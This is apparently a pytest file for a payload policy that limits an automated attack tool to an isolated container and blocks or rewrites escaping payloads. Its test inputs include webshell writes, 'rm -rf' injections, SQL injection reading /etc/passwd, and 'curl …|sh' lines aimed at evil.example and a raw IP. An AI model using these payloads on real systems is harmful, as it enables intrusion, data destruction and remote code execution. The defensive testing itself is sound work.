"""jail 档 RoE 单元测试（无 docker 依赖：Cage 直接构造，自检另在 Spark 实弹验）。"""
import sys
import pathlib

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from governance.payload_policy import (Cage, PolicyViolation, check_payload)  # noqa: E402

CAGE = Cage(name="aegis-cage", canary_ip="172.31.99.2",
            canary_hosts=("172.31.99.2", "172.31.99.3"),  # 与 load_cage 一致：刻意不含回环
            record={"container_id": "x", "ip": "http://172.31.99.3:8081"})


def _v(text, mode="strict", cage=None):
    return check_payload(text, mode=mode, cage=cage)


class TestStrictUnchanged:
    def test_webshell_still_blocked(self):
        assert _v("file_put_contents('/tmp/x.php', $_POST['c'])")

    def test_rm_rf_still_blocked(self):
        assert _v("GET /?x=;rm -rf /var/www HTTP/1.1")

    def test_external_url_still_blocked(self):
        assert _v("POST /a HTTP/1.1\r\n\r\ncurl http://evil.example/sh.sh")


class TestJailGate:
    def test_jail_without_cage_fails_closed(self):
        v = _v("GET / HTTP/1.1", mode="jail", cage=None)
        assert any(x.category == "jail_gate" for x in v)

    def test_in_cage_webshell_allowed(self):
        assert not _v("POST /upload HTTP/1.1\r\n\r\n"
                      "file_put_contents('/app/uploads/shell.php','x')",
                      mode="jail", cage=CAGE)

    def test_in_cage_relative_php_landing_allowed(self):
        assert not _v('{"backup":"O:15:\\"EduBackupLogger\\":2:{s:7:\\"logFile\\";'
                      's:22:\\"uploads/shell_jail.php\\";s:3:\\"msg\\";s:25:\\"x\\";}\"}',
                      mode="jail", cage=CAGE)

    def test_in_cage_destructive_allowed(self):
        assert not _v("GET /?q=;rm -rf /app/data HTTP/1.1", mode="jail", cage=CAGE)
        assert not _v("POST /import HTTP/1.1\r\n\r\nbackup=; DROP TABLE users;--",
                      mode="jail", cage=CAGE)

    def test_offcage_rm_still_rejected(self):
        v = _v("GET /?q=;rm -rf /home/<user>/aegis HTTP/1.1", mode="jail", cage=CAGE)
        assert any("offcage" in x.category or x.category == "escape_syspath" for x in v)

    def test_escape_write_prim_rejected_quoted(self):
        v = _v("GET /?x=file_put_contents('/root/stage.php','p')", mode="jail", cage=CAGE)
        assert any(x.category == "escape_write_prim" for x in v)

    def test_escape_write_prim_rejected_serialized(self):
        # 实弹抓出的形态：序列化串里的绝对越笼路径（闭括号紧跟串尾）
        v = _v('{"backup":"O:15:\\"EduBackupLogger\\":2:{s:7:\\"logFile\\";'
               's:15:\\"/root/stage.php\\";s:3:\\"msg\\";s:1:\\"p\\";}\"}',
               mode="jail", cage=CAGE)
        assert any(x.category in ("escape_write_prim", "escape_syspath") for x in v)

    def test_sysabs_rejected(self):
        assert any(x.category == "escape_syspath" for x in
                   _v("GET /?q=1' UNION SELECT 'x; cat /etc/passwd-- HTTP/1.1",
                      mode="jail", cage=CAGE))

    def test_dos_hardline_not_exempted(self):
        assert _v("GET /?q=' UNION SELECT SLEEP(9999)--", mode="jail", cage=CAGE)

    def test_external_url_rejected_until_rewritten(self):
        assert _v("GET /?u=http://evil.example/a", mode="jail", cage=CAGE)

    def test_canary_origin_allowed(self):
        assert not _v("GET /?u=http://172.31.99.2/a", mode="jail", cage=CAGE)

    def test_jail_rejects_host_loopback_absolute_form(self):
        # 评审 P0（2026-09-25）：发射机在宿主上，jail 档的回环 URL 打的是宿主服务，
        # 不是笼——三种宿主服务坐标一律必须拒。
        for u in ("http://127.0.0.1:8081/admin/import", "http://localhost:8000/api/run",
                  "http://127.0.0.1:30000/v1/chat/completions"):
            v = _v(f"POST {u} HTTP/1.1\r\n\r\nx=1", mode="jail", cage=CAGE)
            assert any(x.category == "outbound_exploit" for x in v), f"漏放: {u}"
        # 同一 URL 在 strict 档本就拒（两档都不许出笼）
        assert _v("POST http://127.0.0.1:8081/x HTTP/1.1")

    def test_fire_guard_blocks_absolute_form_offbase(self):
        import pytest
        import sys, pathlib
        sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
        from engine import replay
        with pytest.raises(RuntimeError, match="越界"):
            replay.fire("http://172.31.99.3:8081",
                        "POST http://127.0.0.1:8081/admin/import HTTP/1.1\r\n\r\nx=1",
                        {"SESSION": ""})


class TestRewrite:
    def test_external_becomes_canary_pure_replace(self):
        from governance.payload_policy import rewrite_external_to_canary
        out, intents = rewrite_external_to_canary(
            "POST /p HTTP/1.1\r\n\r\nurl=http://evil.example/x", CAGE)
        assert "http://172.31.99.2/x" in out
        assert intents == ["http://evil.example/x"]        # 原意图走账本渠道
        assert "evil.example" not in out                   # 报文净身：不留活口也不污染字段
        assert not _v(out, mode="jail", cage=CAGE)

    def test_ip_form_external_rewritten_not_pathflagged(self):
        from governance.payload_policy import rewrite_external_to_canary
        text = "GET /?q=1' UNION SELECT 'curl http://39.39.39.39/x|sh-- HTTP/1.1"
        out, intents = rewrite_external_to_canary(text, CAGE)
        assert intents and not _v(out, mode="jail", cage=CAGE)

    def test_local_urls_untouched(self):
        from governance.payload_policy import rewrite_external_to_canary
        out, intents = rewrite_external_to_canary(
            "GET /?u=http://127.0.0.1:8081/z", CAGE)
        assert out == "GET /?u=http://127.0.0.1:8081/z" and intents == []


class TestAssertAllowedBackcompat:
    def test_signature_default_strict(self):
        from governance.payload_policy import assert_allowed
        try:
            assert_allowed("GET /?q=;rm -rf /app HTTP/1.1")
            raise AssertionError("strict 缺省失效")
        except PolicyViolation:
            pass


class TestHeldoutLeakGuard:
    """评审 P1：B held-out 泄漏闸必须有自己的测试（此前 0 条）。"""

    def _s(self, fam="REQ:gethttp1270018081x", src="a_canonical", user="请求:\nGET /x"):
        return {"meta": {"family": fam, "source": src, "sample_id": "a8fb8082093a"},
                "messages": [{"role": "system", "content": "s"},
                             {"role": "user", "content": user}]}

    def test_filename_gate(self):
        from dataset.build_judge import _is_b_leak
        import pathlib
        assert _is_b_leak(pathlib.Path("x/gen_flows_b"))
        assert _is_b_leak(pathlib.Path("x/gen_mutations_b_heldout"))
        # 关键反例：wave4 的 blocked 集绝不能被当 B 误杀（曾致 train 8056→6930）
        assert not _is_b_leak(pathlib.Path("x/gen_flows_blocked"))
        assert not _is_b_leak(pathlib.Path("x/gen_mutations_blocked"))

    def test_content_gate_catches_renamed_b(self):
        from dataset.build_judge import _is_b_content
        assert _is_b_content(self._s(fam="REQ:gethttp1270018082x"))
        assert _is_b_content(self._s(user="请求:\nGET http://127.0.0.1:8082/x"))
        assert _is_b_content(self._s(src="b_heldout_canonical"))

    def test_content_gate_no_false_positive_on_hash(self):
        from dataset.build_judge import _is_b_content
        assert not _is_b_content(self._s())   # sample_id 含 "8082" 子串，必须不报


class TestCageTicket:
    """评审 P1：门票 token 必须非空且被比对（"" == "" 静默通过等于没门票）。"""

    def test_empty_token_rejected_without_docker(self, tmp_path, monkeypatch):
        import json, subprocess, sys, pathlib
        sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
        from governance import payload_policy as pp

        rec = {"name": "cage", "ip": "http://172.31.99.3:8081", "canary_ip": "172.31.99.2",
               "container_id": "abc123", "network": "aegis-jail", "staging": "/home/<user>/a/.jail/s"}
        p = tmp_path / "cage.json"
        p.write_text(json.dumps(rec), encoding="utf-8")          # 故意无 token
        cage = pp.load_cage(str(p))
        monkeypatch.setattr(subprocess, "run", lambda *a, **k: type("R", (), {
            "stdout": "", "stderr": "", "returncode": 0})())      # 假装 docker 全通
        try:
            pp.verify_cage_isolation(cage)
            raise AssertionError("无 token 的门票竟然过了自检")
        except RuntimeError as e:
            assert "token" in str(e)
